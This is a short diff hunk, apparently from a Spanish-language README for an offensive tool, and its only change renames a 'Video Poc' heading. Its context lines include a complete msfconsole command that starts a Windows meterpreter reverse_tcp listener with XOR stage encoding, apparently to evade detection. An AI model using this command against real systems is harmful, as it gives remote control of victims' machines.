@@ -66,7 +66,7 @@ Inicia msfconsole con el siguiente comando, reemplaza "TuIp" y "TuPuerto" por tu
 msfconsole -x "set lhost TuIp; set lport TuPuerto; set payload windows/meterpreter/reverse_tcp; set EnableStageEncoding true; set StageEncoder x86/xor_dynamic; run"
 ```
 
-# Video Poc (Uso/Use) #
+# Video Poc #
 
 
 
